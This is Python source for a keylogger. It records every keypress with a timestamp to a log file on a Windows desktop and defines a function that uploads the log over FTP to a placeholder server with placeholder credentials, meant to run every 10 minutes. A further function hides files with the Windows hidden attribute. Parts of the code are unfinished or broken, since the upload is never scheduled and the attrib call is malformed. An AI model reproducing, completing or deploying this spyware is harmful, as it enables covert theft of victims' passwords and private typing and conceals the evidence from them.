import ftplib
import sched
import subprocess
import time
from pynput import keyboard


def get_time():
    current_time = time.asctime() 
    return current_time

def logger(key):
    # Creates .txt file and logs all inputs
    with open(f"C:\\Users\\JohnBradshawCantos\\Desktop\\log.txt", "a") as file:
        file.write(f"{get_time()}: {key}\n".replace("'", ""))
    file.close()
    
    # Escaping when esc is pressed
    if key == keyboard.Key.esc:
        listener.stop()

with keyboard.Listener(on_press=logger) as listener:
    listener.join()

# Every 10 mins sends log.txt using FTP
def payload_sender(file, ):
    # If ftplib.FTP doesn't work use ftplib.FTP_TLS
    session = ftplib.FTP("SERVER.address.com", "USERNAME", "PASSWORD" ) # Find server    
    payload = open(f"{file}", "r")                                      
    session.storbinary(f"STOR {file}", payload)                         # Sending file
    payload.close()
    session.quit()

# To not have too many troubles while  
# Rewriting here the same module from sysrunn3r (file hider)
def file_hider(item):
    subprocess.run("attrib", "+H", f"{item}")